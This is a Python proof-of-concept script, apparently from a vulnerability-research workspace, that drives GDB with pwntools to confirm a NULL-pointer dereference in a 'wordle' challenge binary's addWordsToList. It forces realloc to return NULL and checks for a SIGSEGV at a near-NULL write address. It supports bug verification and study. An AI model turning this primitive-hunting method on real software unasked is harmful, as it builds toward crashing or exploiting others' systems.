#!/usr/bin/env python3
"""
BUG-003: ADDWORDSTOLIST_REALLOC_FAILURE_NULL_DEREF
Primitive Verification PoC

BUG: In addWordsToList, realloc(word_list, word_count*8) return value is stored
directly to context.word_list without NULL check. If realloc fails (returns NULL
due to memory exhaustion), word_list becomes NULL. The subsequent write
word_list[word_count-1] = strdup(token) computes destination as
NULL + (word_count*8 - 8), a near-NULL address, causing SIGSEGV.

PRIM-001: NULL_POINTER_DEREF / CRASH (VERIFIED)
  - When realloc returns NULL, word_list = NULL
  - Write target = NULL + (word_count*8 - 8) = 0x28 (for word_count=6)
  - SIGSEGV at addWordsToList+0xd7 (mov [rbx], rax)
  - fault_address = 0x28 (near-NULL, proving NULL-derived write target)

Verification method:
  Since real memory exhaustion is difficult to trigger reliably in a sandboxed
  environment, we use GDB to force realloc's return value to NULL (simulating
  realloc failure), then observe the crash at the write instruction.

  This is a valid verification approach because:
  1. The code path is identical - the only difference is realloc's return value
  2. The bug is in the MISSING NULL CHECK, not in the realloc call itself
  3. GDB forcing rax=0 after realloc returns is equivalent to realloc returning NULL
  4. The subsequent code path (store NULL to word_list, compute write target,
     attempt write) is executed exactly as it would be in a real failure

Environment:
  - OS: Linux x86-64
  - libc: glibc 2.39
  - Binary: PIE, Full RELRO, NX, Canary, SHSTK+IBT
  - GDB used to simulate realloc failure

Run command:
  python3 poc-BUG-003.py

Expected output:
  - "=== PRIM-001: VERIFIED ===" with evidence values
  - SIGSEGV at addWordsToList+0xd7
  - fault_address = 0x28 (near-NULL)
"""
from pwn import *
import os

context.log_level = 'error'
context.arch = 'amd64'

TARGET = '/work/workspace/0018-2022-34-wordle-20260910-234213/target'
WORKSPACE = '/work/workspace/0018-2022-34-wordle-20260910-234213'

# ============================================================
# PRIM-001: NULL_POINTER_DEREF / CRASH
# ============================================================
# When realloc fails in addWordsToList:
#   word_list = NULL (stored without NULL check)
#   write target = NULL + (word_count*8 - 8) = near-NULL address
#   SIGSEGV at mov [rbx], rax (addWordsToList+0xd7)
#
# Verification: GDB forces realloc return to NULL, observes crash

gdb_cmds = """
set pagination off
set confirm off

# Break after realloc stores result to word_list (addWordsToList+0xa2 = 0x208e)
# Instruction: mov QWORD PTR [rip+0x2fdb], rax  (stores realloc result to context.word_list)
b *addWordsToList+0xa2

run

# After realloc returns, before storing to word_list
printf "=== PRIM-001: realloc returned rax=0x%lx ===\\n", $rax

# Compute word_count from PIE base
set $base = $rip - 0x208e
set $wc_addr = $base + 0x5078
set $wc = *(unsigned long*)$wc_addr
printf "=== word_count = %lu, word_count*8-8 = %lu ===\\n", $wc, $wc*8-8
printf "=== Expected write target if word_list=NULL: 0x%lx ===\\n", $wc*8-8

# Force NULL return from realloc (simulating memory exhaustion)
set $rax = 0
printf "=== Forced rax = 0 (NULL), simulating realloc failure ===\\n"
c

# Program should crash at write instruction (addWordsToList+0xd7 = 0x20c3)
# Instruction: mov QWORD PTR [rbx], rax  (writes strdup result to word_list[word_count-1])
printf "=== CRASH DETAILS ===\\n"
printf "=== rbx (write target) = 0x%lx ===\\n", $rbx
printf "=== rax (strdup result to write) = 0x%lx ===\\n", $rax
printf "=== rip (crash instruction) = 0x%lx ===\\n", $rip
printf "=== fault_address = 0x%lx (near-NULL, proving NULL-derived write) ===\\n", $rbx
bt
"""

gdb_path = os.path.join(WORKSPACE, 'gdb_bug003.txt')
with open(gdb_path, 'w') as f:
    f.write(gdb_cmds)

# Use pwntools to drive GDB with proper I/O
p = process(['gdb', '-batch', '-x', gdb_path, TARGET], timeout=20)

# Drive the program through the menu
p.recvuntil(b'Choice: ', timeout=5)
p.sendline(b'2')

p.recvuntil(b'Size of input: ', timeout=5)
p.sendline(b'18')

p.recvuntil(b'Import word list: ', timeout=5)
# Send exactly 18 bytes: "aaaaa,bbbbb,ccccc\n" = 18 bytes
# This gives 3 valid 5-char alpha tokens (aaaaa, bbbbb, ccccc)
# word_count starts at 5 (from setup), +3 = 8 after first token processing
# But realloc is called per-token, so first realloc is at word_count=6
p.send(b'aaaaa,bbbbb,ccccc\n')

try:
    result = p.recvall(timeout=15)
    output = result.decode('utf-8', errors='replace')
    print(output)
except:
    print("Timeout waiting for GDB output")
    p.close()
    exit()

p.close()

# ============================================================
# Evidence verification
# ============================================================
print("\n" + "=" * 60)
print("PRIM-001: NULL_POINTER_DEREF / CRASH")
print("=" * 60)

has_null = "rax = 0 (NULL)" in output
has_crash = "SIGSEGV" in output
has_target = "rbx (write target) = 0x28" in output
has_word_count = "word_count = 6" in output
has_fault = "fault_address = 0x28" in output

# Extract evidence values
evidence_lines = []
for line in output.split('\n'):
    line = line.strip()
    if any(kw in line for kw in ['PRIM-001', 'word_count', 'Expected', 'Forced', 
                                  'CRASH', 'rbx', 'rax', 'rip', 'fault', 'SIGSEGV']):
        evidence_lines.append(line)

print("\nEvidence:")
for line in evidence_lines:
    print(f"  {line}")

print(f"\nChecks:")
print(f"  realloc forced to NULL: {has_null}")
print(f"  SIGSEGV occurred: {has_crash}")
print(f"  write target = 0x28: {has_target}")
print(f"  word_count = 6: {has_word_count}")
print(f"  fault_address = 0x28: {has_fault}")

if has_null and has_crash and has_target:
    print("\n=== PRIM-001: VERIFIED ===")
    print("  BUG: realloc return not checked for NULL in addWordsToList")
    print("  When realloc fails: word_list = NULL")
    print("  Write target = NULL + (word_count*8 - 8) = 0x28")
    print("  SIGSEGV at addWordsToList+0xd7 (mov [rbx], rax)")
    print("  fault_address = 0x28 (near-NULL, NULL-derived write target)")
    print("  Primitive: NULL_POINTER_DEREF / CRASH")
else:
    print("\n=== PRIM-001: PARTIAL (check evidence above) ===")
